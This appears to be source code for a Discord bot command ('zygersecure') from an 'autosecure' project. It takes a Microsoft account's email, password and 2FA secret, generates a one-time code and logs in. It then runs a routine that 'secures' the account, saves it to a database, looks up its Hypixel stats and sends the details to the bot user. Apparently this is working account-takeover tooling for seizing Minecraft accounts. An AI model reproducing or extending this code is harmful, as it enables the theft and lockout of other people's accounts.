const generateotp = require("../../utils/secure/codefromsecret.js");
const generateuid = require("../../utils/generateuid.js");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const login = require('../../utils/secure/login.js')
const secure = require("../../utils/secure/recodesecure.js");
const statsembed = require("../../utils/stats/statsembed.js");
const fetchStats = require("../../utils/hypixelapi/fetchStats.js");
const listAccount = require("../../utils/accounts/listAccount.js");
const insertaccount = require('../../../db/insertaccount')
const { queryParams } = require('../../../db/database.js')
const getStats = require("../../utils/hypixelapi/getStats.js")
const short = require("short-number")
const mcregex = require("../../.././autosecure/utils/utils/mcregex.js")
const { failedembed } = require("../../utils/embeds/embedhandler.js");

module.exports = {
    name: "zygersecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {

            let settings = await client.queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id])
            if (settings.length === 0) {
                return interaction.reply({
                    embeds: [{
                        title: `Error :x:`,
                        description: `Unexpected error occurred!`,
                        color: 0xff0000
                    }],
                    ephemeral: true
                });
            }
            settings = settings[0];
            
            // Get values from modal fields (matching the modalBuilder IDs from secure.js)
            const email = interaction.fields.getTextInputValue('email');
            const password = interaction.fields.getTextInputValue('pw');
            const secretkey = interaction.fields.getTextInputValue('secretkey');
            const mcign = interaction.fields.getTextInputValue('username') || null;
    
            if (mcign && !mcregex(mcign)){
                return interaction.reply({
                    content: "Please enter a valid minecraft username!",
                    ephemeral: true
                })
            }


            await interaction.deferReply({ ephemeral: true });

            console.log(`[Zyger Secure] Email: ${email}, SecretKey provided: ${!!secretkey}, MC IGN: ${mcign}`);

            // Generate OTP from secret key
            let otpData;
            try {
                otpData = await generateotp(secretkey);
                if (!otpData || !otpData.otp) {
                    return interaction.editReply({
                        embeds: [{
                            title: `Failed to Generate OTP`,
                            description: `The secret key format appears to be invalid. Please check and try again.`,
                            color: 0xff0000
                        }],
                    });
                }
            } catch (error) {
                console.error(`[Zyger Secure] OTP generation error:`, error);
                return interaction.editReply({
                    embeds: [{
                        title: `OTP Generation Error`,
                        description: `Failed to generate OTP: ${error.message}`,
                        color: 0xff0000
                    }],
                });
            }

            const { otp } = otpData;
            console.log(`[Zyger Secure] Generated OTP: ${otp.substring(0, 3)}***`);

            // Attempt login with email, password, and OTP
            let host;
            try {
                console.log(`[Zyger Secure] Attempting login with email: ${email}, OTP: ${otp.substring(0, 3)}***`);
                host = await login({ otp: otp, email: email, pw: password }, null);
                console.log(`[Zyger Secure] Login returned: ${host ? 'Valid host' : 'No host'}`);
            } catch (error) {
                console.error(`[Zyger Secure] Login error:`, error);
                return interaction.editReply({
                    embeds: [{
                        title: `Login Error`,
                        description: `An error occurred during login: ${error.message}`,
                        color: 0xff0000
                    }],
                });
            }

            console.log(`[Zyger Secure] Login response: ${host ? 'Success' : 'Failed'}`)

            if (host === "tfa") {
                return interaction.editReply({
                    content: "Invalid details or 2FA is not properly configured. Try recovery code securing or manually login to resolve issues.",
                    ephemeral: true
                });
            }

            if (!host) {
                return interaction.editReply({
                    embeds: [{
                        title: `Login Failed`,
                        description: `Invalid email, password, or secret key. Please verify your credentials and try again.`,
                        color: 0xff0000
                    }],
                });
            }

            let uid = await generateuid();
            const embed = {
                title: 'This account is being automatically secured.',
                color: 0x808080
            };

            const components = [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId(`status|${uid}`)
                        .setLabel('⏳ Status')
                        .setStyle(ButtonStyle.Primary)
                )
            ];

            await interaction.editReply({ embeds: [embed], components });
            await interaction.user.send({ embeds: [embed], components });

            try {
                console.log(`uid: ${uid}`);

                let acc = await secure(host, settings, uid, mcign);


                await insertaccount(acc, uid, client.username, settings.secureifnomc)


                    const failedmsg = await failedembed(acc, uid);

                    if (failedmsg.failed) {
                        await interaction.followUp(failedmsg.failedmsg);
                        await interaction.user.send(failedmsg.failedmsg);
                        return;
                    }


                if (acc.newName == "No Minecraft!") {
                    let accountmessage = await listAccount(acc, uid, client, interaction);;
                    await interaction.user.send(accountmessage);
                    return;
                }
                
                
              //  console.log(stats);
                let statsoverview = await statsembed(client, acc, interaction);
                let accountmessage = await listAccount(acc, uid, client, interaction);;
                
     
                if (statsoverview) {
                    await interaction.user.send(statsoverview);
                }
                await interaction.user.send(accountmessage);
                
                // Send final message to channel showing account was secured
                await interaction.editReply({
                    embeds: [{
                        title: '✅ Account Secured Successfully',
                        description: 'Your account has been secured. Check your DMs for details.',
                        color: 0x00ff00
                    }]
                });
            } catch (error) {
                console.error(`[Zyger Secure] Securing error:`, error);

                await interaction.editReply({
                    embeds: [{
                        title: `Error Securing Account`,
                        description: `An error occurred while securing your account: ${error.message}`,
                        color: 0xff0000
                    }],
                });
            }
        } catch (error) {
            console.error("Command execution error:", error);
            await interaction.editReply({
                embeds: [{
                    title: `Error`,
                    description: `An unexpected error occurred while processing your request.`,
                    color: 0xff0000
                }],
            });
        }
    }
};
